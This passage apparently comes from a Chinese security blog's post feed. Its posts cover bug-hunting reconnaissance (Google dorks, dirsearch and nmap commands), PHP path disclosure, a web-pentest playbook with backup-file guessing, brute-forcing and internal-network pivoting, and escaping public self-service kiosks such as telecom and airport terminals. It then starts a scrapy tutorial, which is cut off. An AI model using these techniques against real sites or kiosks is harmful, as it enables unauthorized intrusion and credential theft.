lijiejie的子域名收集工具（个人觉得挺好用的）；</p></li><li><p>layer：这个工具也不错；</p></li><li><p>oneforall</p><blockquote><p>对收集到到域名进行指纹探测，查询是否有Nday</p><p>工具：Ehole、Glass</p></blockquote></li></ul><p>但是只要是工具就会有误报，建议大家对获取的子域名写个脚本处理一下；判断哪些是可以访问的，哪些是不可以访问的，哪些访问是测试页面的。可以节约不少时间。</p><p>利用google hacking 搜索，大家一定不要只用google 搜索，这样是不全面的，还有 bing（不用翻墙）、百度、360等等，因为很多国内的网站利用google去搜索是搜不到的。这里就不说语法了，贴几条常用的就行了</p><blockquote><p>搜集敏感文件：site:xxx.com filetype:doc</p><p>搜集管理后台：site:xxx.com 管理／site:xxx.com admin／site:xxx.com login</p><p>搜集mail：site:xxx.com intext:@xxx.com／intext:@xxx.com</p><p>搜集敏感web路径：site:xxx.com intitle:登录／site:xxx.com inurl:sql.php</p></blockquote><h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><p>这一块是比较大的一块，我这里举一些：</p><ul><li><p>github源代码：网上有工具（<a href="https://github.com/repoog/GitPrey%EF%BC%89">https://github.com/repoog/GitPrey）</a></p></li><li><p>svn信息泄漏：这个只能用扫描器了</p></li><li><p>敏感文件：比如数据库配置文件啦（有案例的）、网站源码啊、数据库备份文件等等</p></li><li><p>敏感目录：网站后台目录／一些登录地址／一些接口目录</p><blockquote><p>dirsearch</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 dirsearch.py -u www.xxx.com -e * -t <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>线程数-t设置小一点</p></blockquote></li><li><p>JS信息收集</p><blockquote><p>JSFinder、各种js文件寻找隐藏接口</p></blockquote></li><li><p>email：邮箱命名规则、公司是否具有邮箱默认密码（这个可以采取社工，毕竟我司默认密码就很弱鸡）。</p></li><li><p>员工号：很多oa、um、sso系统都是采用员工号登录的，所以知道员工号的规则很多时候能帮助我们进行撞库。</p></li><li><p>商家信息：如果是一些具有商家系统的，能收集到一些商家账户（自己搞去，可以注册，注册资料请百度）就可以进入很多系统来测试了。</p></li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -sS -Pn -n --open --min-hostgroup <span class="token number">4</span> --min-parallelism <span class="token number">1024</span> --host-timeout <span class="token number">30</span> -T4 -v  examples.com<span class="token function">sudo</span> nmap -sS -Pn -n --open --min-hostgroup <span class="token number">4</span> --min-parallelism <span class="token number">1024</span> --host-timeout <span class="token number">30</span> -T4 -v -p <span class="token number">1</span>-65535 examples.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>其实很多时候，我们通过信息收集能得到不少的漏洞了，我这里举几个简单的案例：</p><ul><li>通过搜索引擎获取系统管理页面，直接越权访问；</li><li>通过github直接找到管理后台账号密码；</li><li>通过目录／文件扫描直接得到系统信息（ip、管理员账号密码）连入服务器；</li><li>当然也有很多通过信息收集得到一些东西结合其他手段；</li></ul><h2 id="漏洞挖掘的中期–信息处理"><a href="#漏洞挖掘的中期–信息处理" class="headerlink" title="漏洞挖掘的中期–信息处理"></a>漏洞挖掘的中期–信息处理</h2><h3 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h3><p>对于收集到的信息，我们不能收集完了就完了，一定好好整理，会对后期渗透有很大的帮助</p><p>利用word或excel或txt 都行，我建议word 和excel，因为txt毕竟太简单了</p><p>分类：</p><ul><li>哪些网站功能类似；</li><li>哪些网站可能使用的同一模版；</li><li>哪些网站有waf（这个一般在url中标明就好）；</li><li>哪些网站能登录（注册的账号也一定要记住，最好可以准备两个手机号，两个邮箱方便注册）；</li><li>哪些网站暴露过哪些类型的漏洞（这个只能去乌云上面找）；</li><li>网站目前有哪些功能（这个稍微关注一下网站公告，看最近是否会有业务更迭）；</li></ul><h3 id="漏洞整理"><a href="#漏洞整理" class="headerlink" title="漏洞整理"></a>漏洞整理</h3><p>我们辛苦的挖洞一定要对我们挖掘出来的漏洞有一个记录，记录的可以稍微详细一些，一是可以方便自己以后回顾，还有就是以后说不定有些地方出现了跟以前一样的功能，这样就方便我们更快的找到漏洞。这里建议doc文档，图片可以贴的详细一些</p><p>第二个就是通过漏洞得到的一些数据：</p><ul><li>订单信息；遍历、注入</li><li>用户信息：这个可以通过撞库获取、任意密码重置获取、注入</li><li>数据库用户名密码：注入、配置泄漏</li></ul><p>为什么我们要整理这些数据，因为我们要根据这些数据来设计我们的字典</p><h2 id="漏洞挖掘的后期–漏洞挖掘"><a href="#漏洞挖掘的后期–漏洞挖掘" class="headerlink" title="漏洞挖掘的后期–漏洞挖掘"></a>漏洞挖掘的后期–漏洞挖掘</h2><p>毕竟漏洞的类型就那么些，像前文说过就是owasp top 10、逻辑，对于挖掘这些漏洞，我觉得没什么特别好的办法，就是抓包分析逻辑（这里说的不包括对软件客户端的挖掘、app的挖掘）</p><p>首先我们需要对一个网站／app有一个了解要知道它的功能点有哪些</p><p>其次我们要分析这个网站／app里面的请求哪些是我们可以控制的参数，这些地方就是漏洞经常出没的点</p><p>最后就是分析逻辑，这一类别的漏洞主要还是涉及一套流程，这里举个例子：</p><blockquote><p> 买东西</p><ul><li>首先我们要选择：</li></ul><ol><li>筛选涉及查询（是否可以SQL注入）</li><li>加入购物车：商品数量是否可以为负</li></ol><ul><li>询问商家：</li></ul><ol><li>跳转客服系统，跳转url中是否含有用户参数</li><li>xss打客服cookie</li><li>钓鱼+社工</li></ol><ul><li>下单：</li></ul><ol><li>填地址，涉及插入（注入）、xss</li><li>修改单价</li><li>修改总额（这里说明一下修改总额：情况1，就是我们可能会遇到可以使用优惠卷的情况，比如我们买了100的东西只能使用5块的优惠价，但是我有一张50的优惠卷是否可以使用；情况2，打折我们是否可以修改打折的折扣；情况3，我们是否可以修改运费，将运费改为负数；情况n）</li><li>备注：xss，sql注入</li></ol><ul><li>电子票据：</li></ul><ol><li>会写抬头</li></ol><ul><li>支付：</li></ul><ol><li>传输过程中是否可以修改，如果是扫描二维码支付，我们可以分析一下二维码中的请求url看是否可以修改以后重新生成二维码（这里不讨论具体的支付了，因为微信和支付宝都很安全）</li></ol><ul><li>订单完成：</li></ul><ol><li>是否可以遍历订单</li></ol><ul><li>评价：</li></ul><ol><li>注入、上传图片、xss</li></ol><ul><li>退货..</li></ul><p>大家可以无限延伸，这里只是抛砖引玉。</p></blockquote><p>建议：</p><p>src慢慢的挖多了系统更新不快，业务不多自然就很难挖了，所以一定要有坚持精神，深入挖掘意识，因为挖洞没有想象中的那么简单；不要想一步登天，多去看看一些案例分析一下别人的挖掘思路，然后跟着学。</p><h2 id="挖洞小技巧"><a href="#挖洞小技巧" class="headerlink" title="挖洞小技巧"></a>挖洞小技巧</h2><p>敢于怀疑漏洞的存在，然后再去验证它</p><p>从开发设计的角度去看，想开发所想</p><p>了解业务和情报收集</p><p>坚持和努力就会有所回报</p><p>多看师傅们的文章，学会师傅们的骚操作和思路</p><p>运气也很重要，但是努力的人运气一般不会太差哦</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php爆路径</title>
      <link href="/2021/09/23/php%E7%88%86%E8%B7%AF%E5%BE%84/"/>
      <url>/2021/09/23/php%E7%88%86%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<p>PHP爆路径的一些方法</p><h2 id="单引号爆路径"><a href="#单引号爆路径" class="headerlink" title="单引号爆路径"></a>单引号爆路径</h2><p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息<br><a href="http://www.xxx.com/news.php?id=149%E2%80%B2">www.xxx.com/news.php?id=149′</a></p><h2 id="错误参数值爆路径"><a href="#错误参数值爆路径" class="headerlink" title="错误参数值爆路径"></a>错误参数值爆路径</h2><p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试<br><a href="http://www.xxx.com/researcharchive.php?id=-1">www.xxx.com/researcharchive.php?id=-1</a></p><h2 id="Google爆路径"><a href="#Google爆路径" class="headerlink" title="Google爆路径"></a>Google爆路径</h2><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多<br>Site:xxx.edu.tw warning<br>Site:xxx.com.tw “fatal error”</p><h2 id="测试文件爆路径"><a href="#测试文件爆路径" class="headerlink" title="测试文件爆路径"></a>测试文件爆路径</h2><p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。<br><a href="http://www.xxx.com/test.php">www.xxx.com/test.php</a><br><a href="http://www.xxx.com/ceshi.php">www.xxx.com/ceshi.php</a><br><a href="http://www.xxx.com/info.php">www.xxx.com/info.php</a><br><a href="http://www.xxx.com/phpinfo.php">www.xxx.com/phpinfo.php</a><br><a href="http://www.xxx.com/php_info.php">www.xxx.com/php_info.php</a><br><a href="http://www.xxx.com/1.php">www.xxx.com/1.php</a></p><h2 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h2><p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin</p><ol><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpMyAdmin/index.php?lang[]=1</li><li>/phpMyAdmin/phpinfo.php</li><li>load_file()</li><li>/phpmyadmin/themes/darkblue_orange/layout.inc.php</li><li>/phpmyadmin/libraries/select_lang.lib.php</li><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpmyadmin/libraries/mcrypt.lib.php </li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些渗透经验</title>
      <link href="/2021/09/23/%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C/"/>
      <url>/2021/09/23/%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>渗透测试过程中的一些经验</p><h2 id="看网站是什么脚本？"><a href="#看网站是什么脚本？" class="headerlink" title="看网站是什么脚本？"></a>看网站是什么脚本？</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>网站根目录里<br> index.php<br> index.asp<br> index.aspx<br> index.jsp<br> index.do （jsp）</p><p>如果访问正常就说明 是属于哪一类的脚本程序</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用 google.com</p><p>如搜索 <a href="http://www.xx.com/">www.xx.com</a> aspx</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>burpsuit爬虫</p><h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>目录扫描工具</p><h2 id="判断是否内网"><a href="#判断是否内网" class="headerlink" title="判断是否内网"></a>判断是否内网</h2><h3 id="首先要确认真实IP"><a href="#首先要确认真实IP" class="headerlink" title="首先要确认真实IP"></a>首先要确认真实IP</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><p>有的网站会记录网站历史IP 如站长之家之类的</p><h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>找PHPinfo, asp之类的文件都会暴露服务器真实IP </p><h4 id="思路3"><a href="#思路3" class="headerlink" title="思路3"></a>思路3</h4><p>找二级域名有的管理不会把二级域名做cdn(看运气了)</p><h4 id="思路4"><a href="#思路4" class="headerlink" title="思路4"></a>思路4</h4><p>有的大型网站都有自己的邮件服务器注册之后，会主动发一封邮件给我们。。。 好吧。。打开邮件的源代码。。 你就能看到服务器的真实Ip了</p><h3 id="知道了IP-扫下开放端口"><a href="#知道了IP-扫下开放端口" class="headerlink" title="知道了IP 扫下开放端口"></a>知道了IP 扫下开放端口</h3><p>如果只开放http端口 其他什么端口都没开的（95%为内网）</p><p>如果开放了http端口跟FTP端口 其他什么端口都没开 （75%为内网）</p><p>如果开放了http端口跟FTP端口跟数据库端口 （55%为内网）</p><h2 id="判断服务器类型"><a href="#判断服务器类型" class="headerlink" title="判断服务器类型"></a>判断服务器类型</h2><h3 id="第一"><a href="#第一" class="headerlink" title="第一"></a>第一</h3><p> 直接ping服务器ip，看回显信息进行判断</p><p>TTL=32   9X/ME</p><p>TTL=64   linux</p><p>TTL=128  2000X/XP</p><p>TTL=255  UNIX</p><h3 id="第二"><a href="#第二" class="headerlink" title="第二"></a>第二</h3><p> 利用 御剑 wwwscan ScorpioScan 等工具</p><h2 id="网站目录"><a href="#网站目录" class="headerlink" title="网站目录"></a>网站目录</h2><p><code>robots.txt</code></p><p>对于<code>http://www.zzrsks.com.cn/wsbm2013/</code>，把2013改成2012,2011 2010. 看看存不存在</p><p>很多傻B管理员为了方便记主这些文件 把备份文件名改成 wsbm2013.rar, wsbm2013.7z, wsbm2013.zip 放在网站程序根目录里像这样：<a href="http://www.zzrsks.com.cn/wsbm2013/wsbm2013.rar">http://www.zzrsks.com.cn/wsbm2013/wsbm2013.rar</a></p><p>或者 wsbm.rar, wsbm1.rar, wsbmwsbm.rar </p><p>如果没有，我们再回到根目录<a href="http://www.zzrsks.com.cn/">http://www.zzrsks.com.cn/</a></p><p>把注意力转向到zzrsks这里<a href="http://www.zzrsks.com.cn/zzrsks">http://www.zzrsks.com.cn/zzrsks</a></p><p><a href="http://www.zzrsks.com.cn/webzzrsks">http://www.zzrsks.com.cn/webzzrsks</a><br><a href="http://www.zzrsks.com.cn/">http://www.zzrsks.com.cn/</a>** (管理员的QQ号 或者他的名字 如果目录没有 就试试备份文件后缀)</p><p><a href="http://www.zzrsks.com.cn/zzrsks.rar">http://www.zzrsks.com.cn/zzrsks.rar</a>, <a href="http://www.zzrsks.com.cn/webzzrsks.rar">http://www.zzrsks.com.cn/webzzrsks.rar</a> </p><h2 id="检测目标站"><a href="#检测目标站" class="headerlink" title="检测目标站"></a>检测目标站</h2><p>我们知道了他开放3个http端口80, 8081, 8083</p><h3 id="先从默认80端口安全检测"><a href="#先从默认80端口安全检测" class="headerlink" title="先从默认80端口安全检测"></a>先从默认80端口安全检测</h3><h4 id="检测SQL漏洞"><a href="#检测SQL漏洞" class="headerlink" title="检测SQL漏洞"></a>检测SQL漏洞</h4><p>经典注入 静态注入 登陆框注入 搜索框注入 等</p><h4 id="检测越权漏洞"><a href="#检测越权漏洞" class="headerlink" title="检测越权漏洞"></a>检测越权漏洞</h4><p>文件拦截跳转 后台文件直接打开直接添加管理员 等</p><h4 id="检测XSS漏洞"><a href="#检测XSS漏洞" class="headerlink" title="检测XSS漏洞"></a>检测XSS漏洞</h4><p>先来个反射型XSS，看看过滤严不严，如果过滤了什么符号，就想办法绕过去来XSS跨站等备份，或者直接拿shell。PS：如果不精通XSS的朋友们 就盲打吧= = 看看收获点什么</p><h4 id="检测上传漏洞"><a href="#检测上传漏洞" class="headerlink" title="检测上传漏洞"></a>检测上传漏洞</h4><p>注册会员啊，扫目录看看存不存在FCK 或者 eWebEditor上传页面，如果有eWebEditor上传页面的话，就利用对应的0day进行一次上传</p><h4 id="测试其他漏洞"><a href="#测试其他漏洞" class="headerlink" title="测试其他漏洞"></a>测试其他漏洞</h4><p>比如用google搜索敏感信息，比如txt, bak什么的，我记得我就有1次利用GOOGLE爆了目标站的root密码</p><h3 id="如果失败就换下一个端口"><a href="#如果失败就换下一个端口" class="headerlink" title="如果失败就换下一个端口"></a>如果失败就换下一个端口</h3><p>假设为8081端口，<a href="http://www.xx.com:8081/">www.xx.com:8081/</a><br>然后我们用程序指纹来扫是属于哪里的cms，到是哪里的cms后，进行0day exp 利用。</p><h4 id="如果扫不出来-怎么办呢？"><a href="#如果扫不出来-怎么办呢？" class="headerlink" title="如果扫不出来 怎么办呢？"></a>如果扫不出来 怎么办呢？</h4><p>没关系，还可以试试另外一种方法。</p><p>打开网站后随便打开一个网站程序文件，如：<a href="http://www.x.com/xindong/kkks.aspx">www.x.com/xindong/kkks.aspx</a><br>那么在google那里 搜索一下（利用google 语句 如：intitle:   inurl：  intext: Filetype: Site：等等的语句）xindong/kkks.aspx   文件</p><blockquote><p>site:xx.com inurl:admin</p><p>site:xx.com intext:用户名</p></blockquote><p>然后查找敏感信息  PS：运气好 还可以找到这程序的下载源码</p><p>我们搜索了从google那里发现了一个公司站 ，目录跟文件跟目标站是一模一样的，我们也可以拿下那个公司站，拿下后把源码打包，然后挖掘0day</p><h4 id="在google搜不到怎么办？"><a href="#在google搜不到怎么办？" class="headerlink" title="在google搜不到怎么办？"></a>在google搜不到怎么办？</h4><p>第一：这程序是私人写的 没公布<br>解决方法：只能慢慢安全检测了</p><p>第二：这程序目录 文件夹名 文件名 被改了<br>解决方法：查看原代码 搜索一段代码，或者利用google搜索他的CSS、JS文件 </p><h3 id="如果端口都没有漏洞"><a href="#如果端口都没有漏洞" class="headerlink" title="如果端口都没有漏洞"></a>如果端口都没有漏洞</h3><p>只能爆破了 组合好强大的字典 进行爆破 http后台 FTP MYSQL MSSQL 等等端口</p><h3 id="傻瓜式渗透"><a href="#傻瓜式渗透" class="headerlink" title="傻瓜式渗透"></a>傻瓜式渗透</h3><p>比如<a href="http://www.x.com的一个站,先爬行得到他的目录/">www.x.com的一个站，先爬行得到他的目录</a></p><p><a href="http://www.x.com/1">www.x.com/1</a><br><a href="http://www.x.com/2">www.x.com/2</a><br><a href="http://www.x.com/3">www.x.com/3</a><br>先记录下来，然后把你组合的强大字典 ASPX ASP PHP JSP 4类程序，全部拉在一起，一起扫描</p><p>先扫描网站根目录，再次得到一些你不知道的目录</p><p><a href="http://www.x.com/1mn">www.x.com/1mn</a><br><a href="http://www.x.com/xindong">www.x.com/xindong</a></p><p>然后又记录下来，然后跟爬行得出的目录放在一起</p><p><a href="http://www.x.com/1">www.x.com/1</a><br><a href="http://www.x.com/2">www.x.com/2</a><br><a href="http://www.x.com/3">www.x.com/3</a><br><a href="http://www.x.com/1mn">www.x.com/1mn</a><br><a href="http://www.x.com/xindong">www.x.com/xindong</a></p><p>然后把重复的内容去掉，然后放在进去扫描目录，然后又得出新目录跟文件<br><a href="http://www.x.com/1/xss/">www.x.com/1/xss/</a><br><a href="http://www.x.com/2/qqww/">www.x.com/2/qqww/</a><br><a href="http://www.x.com/3/asdasd/">www.x.com/3/asdasd/</a><br><a href="http://www.x.com/1mn/ssaq/">www.x.com/1mn/ssaq/</a><br><a href="http://www.x.com/xindong/admin.asp">www.x.com/xindong/admin.asp</a><br>然后又把<br><a href="http://www.x.com/1/xss/">www.x.com/1/xss/</a><br><a href="http://www.x.com/2/qqww/">www.x.com/2/qqww/</a><br><a href="http://www.x.com/3/asdasd/">www.x.com/3/asdasd/</a><br><a href="http://www.x.com/1mn/ssaq/">www.x.com/1mn/ssaq/</a><br>再次进行扫描，相信大家都理解了吧</p><blockquote><p>之前利用傻瓜式 丢在服务器里跑 结果发现个备份文件，下载打开一看发现是sa用户跟密码<br>PS：如果发现密码不对，可以用这个密码，去试试登录FTP、服务器、后台什么的，或者再次利用这个密码来组合密码字典来爆破</p></blockquote><h2 id="网站无能为力，尝试C段"><a href="#网站无能为力，尝试C段" class="headerlink" title="网站无能为力，尝试C段"></a>网站无能为力，尝试C段</h2><h3 id="怎么找内网C段"><a href="#怎么找内网C段" class="headerlink" title="怎么找内网C段"></a>怎么找内网C段</h3><p>第一 通过二级域名来渗透（一般都是同网关的 我试过）</p><p>第二 用御剑扫描C段 比如网站IP是*.*.4.156，而网站的标题是：学籍管理，那么就扫描*.*.3.1 ~ *.*.5.254 的80 81 8080 8081端口，看哪个开放，然后分析，看哪个标题比较敏感，比如内部登录系统或者教师登录 什么的，然后拿下他的shell</p><p>如果支持命令，先不要急着提权，先看看同不同网关，直接在shell cmd命令里扫描整个内网端口 <code>netstat -an | find &quot; &quot;</code></p><p>主要扫3个目标站已开的端口 80 8081 8083，如果某个IP 这3个端口都开了 80%同网关，然后进去就可以内网渗透了</p><p>如果内网渗透不成功 就内网嗅探</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>收集信息→目标站渗透→开放端口渗透→旁站渗透→C段渗透</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有趣的终端机绕过</title>
      <link href="/2021/09/23/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/23/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>自助终端机采用的触摸屏的方式，用户点触计算机显示屏上的文字或图片就能实现对主机操作。这些自助终端机很多都是基于windows平台的，通常是采用将程序的窗口最大化，始终置前，隐藏系统桌面的方式，使用户只能在当前应用下操作，不能逃逸。</p><h2 id="通过特定操作，使程序报错"><a href="#通过特定操作，使程序报错" class="headerlink" title="通过特定操作，使程序报错"></a>通过特定操作，使程序报错</h2><p>由于终端机通常是触控的，有时通过构造特定的错误操作，或频繁的点击等方式使程序报错，或造成内存爆满，从而弹出错误信息，而此时通过出错信息能找到入口。当然让程序报错的方式各种各样，要灵活发现，有的甚至直接进入桌面。</p><h3 id="中国移动话费充值终端机"><a href="#中国移动话费充值终端机" class="headerlink" title="中国移动话费充值终端机"></a>中国移动话费充值终端机</h3><p>输入错误的手机号，并点击忘记密码，程序报错，同时右下角出现语言栏提示，点击提示即可调用本地资源管理器，从而进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f2.png"></p><h3 id="双流机场查询系统终端"><a href="#双流机场查询系统终端" class="headerlink" title="双流机场查询系统终端"></a>双流机场查询系统终端</h3><p>频繁点击屏幕，通常是多点多次触控，使程序响应不过来，进而崩溃，进入桌面</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f4.png"></p><h3 id="中国电信自助服务终端"><a href="#中国电信自助服务终端" class="headerlink" title="中国电信自助服务终端"></a>中国电信自助服务终端</h3><p>输入错误信息，使程序报错，右下角弹出语言栏，进一步利用从而进入本地资源管理器</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f6.png"></p><h2 id="通过右键菜单"><a href="#通过右键菜单" class="headerlink" title="通过右键菜单"></a>通过右键菜单</h2><p>通常是因为没有屏蔽右键菜单或者一些敏感选项。长按某一位置，几秒后弹出右键菜单选项，通常通过右键菜单的一些选项，比如“属性”、“打印机设置”、“另存为”、“打印”、“关于”之类的选项进行利用。另存为则直接弹出windows资源管理器，然后继续右键，选择资源管理器，找到osk.exe和taskmgr.exe，结束相关进程，从而进入桌面系统</p><h3 id="白云机场免费上网终端"><a href="#白云机场免费上网终端" class="headerlink" title="白云机场免费上网终端"></a>白云机场免费上网终端</h3><p>未屏蔽敏感右键菜单，点出右键菜单后，有目标另存为、属性等众多敏感选项，从而调出资源管理器进入桌面</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f7.png"></p><h3 id="中国移动自助营业终端机"><a href="#中国移动自助营业终端机" class="headerlink" title="中国移动自助营业终端机"></a>中国移动自助营业终端机</h3><p>通过右键菜单，选择添加打印机，一步步找到本地资源管理器，从而进一步进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f8.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f9.png"></p><h3 id="自动售药机"><a href="#自动售药机" class="headerlink" title="自动售药机"></a>自动售药机</h3><p>通过右键，找到关于信息，然后一步步调出资源管理器，进一步进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f10.png"></p><h3 id="图书馆一终端查询机"><a href="#图书馆一终端查询机" class="headerlink" title="图书馆一终端查询机"></a>图书馆一终端查询机</h3><p>仔细寻找发现一处右键可以进行“打印预览”的选项，从而通过打印预览进入桌面系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f11.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f12.png"></p><h2 id="通过页面的一些调用本地程序的按钮"><a href="#通过页面的一些调用本地程序的按钮" class="headerlink" title="通过页面的一些调用本地程序的按钮"></a>通过页面的一些调用本地程序的按钮</h2><p>比如“打印按钮”、“发邮件”、“安装程序按钮”、“帮助链接”等等。通常程序会调用本地浏览器或软件，从而进行利用利用</p><h3 id="图书馆一查询设备"><a href="#图书馆一查询设备" class="headerlink" title="图书馆一查询设备"></a>图书馆一查询设备</h3><p>调出“打印预览”</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f13.png"></p><p>点击“帮助信息”调用本地浏览器。从而用多种方法进入桌面系统。此处选择“工具-internet选项-浏览历史记录-设置-查看文件”然后打开屏幕键盘和任务管理器。</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f14.png"></p><h3 id="中关村地下购物广场终端"><a href="#中关村地下购物广场终端" class="headerlink" title="中关村地下购物广场终端"></a>中关村地下购物广场终端</h3><p>通过发送邮件按钮，调出outlook，进而可以调用本地资源管理器，从而进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f15.png"></p><h2 id="通过输入法、屏幕键盘、快捷键等方法"><a href="#通过输入法、屏幕键盘、快捷键等方法" class="headerlink" title="通过输入法、屏幕键盘、快捷键等方法"></a>通过输入法、屏幕键盘、快捷键等方法</h2><p>很多终端有时因为错误，或者设置问题会直接显示输入法。通常可以通过右键输入法等找到资源管理器。有的拼音输入法直接显示出来，有的可以直接利用。而输入法有时，比如qq输入法、搜狗输入法通常都可以调用本地浏览器等等</p><h3 id="邮政自助终端机"><a href="#邮政自助终端机" class="headerlink" title="邮政自助终端机"></a>邮政自助终端机</h3><p>按快捷键CTRL+S 调出资源管理器，进行进一步利用</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f16.png"></p><h3 id="通过输入法绕过"><a href="#通过输入法绕过" class="headerlink" title="通过输入法绕过"></a>通过输入法绕过</h3><p>点击帮助，出现提示，找不到文件。然后就调用打开了资源管理器了</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f17.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f18.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f19.png"></p><h2 id="可以物理接触终端机的电源线、网线的情况下"><a href="#可以物理接触终端机的电源线、网线的情况下" class="headerlink" title="可以物理接触终端机的电源线、网线的情况下"></a>可以物理接触终端机的电源线、网线的情况下</h2><p>在可以物理接触终端机的情况下，可以将电源拔掉，然后终端机重启。当出来桌面时候，快速的点击开始-程序-启动。将启动栏目的程序删掉。然后继续重启，默认的重启后不会调用原有的程序（当然是针对没有还原系统的终端机来说，很多都是没有的），从而进入桌面系统；</p><p>可以直接拔掉网线，程序有时会弹出错误提示，从而进一步操作进入终端机</p><p>可以在重新插拔电源后进行</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>进入触屏界面后该如何操作？调出资源管理器，然后调出最基本的几个程序。进入c:\windows\system32\目录下。一般先打开osk.exe，此为屏幕键盘程序； taskmgr.exe任务管理器，用来结束相应的程序；cmd.exe用来执行命令。接下来判断所处的网络环境，进行进一步的内网渗透了。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 终端机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-spider3</title>
      <link href="/2021/09/21/python-spider3/"/>
      <url>/2021/09/21/python-spider3/</url>
      
        <content type="html"><![CDATA[<p><code>scrapy</code></p><h2 id="create-project-file"><a href="#create-project-file" class="headerlink" title="create project file"></a>create project file</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token operator">></span>scrapy startproject scrapydemoNew Scrapy project <span class="token string">'scrapydemo'</span>, using template directory <span class="token string">'f:\python39\lib\site-packages\scrapy\templates\project'</span>, created in:    E:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token punctuation">\</span>scrapydemoYou can start your first spider with:    <span class="token builtin class-name">cd</span> scrapydemo    scrapy genspider 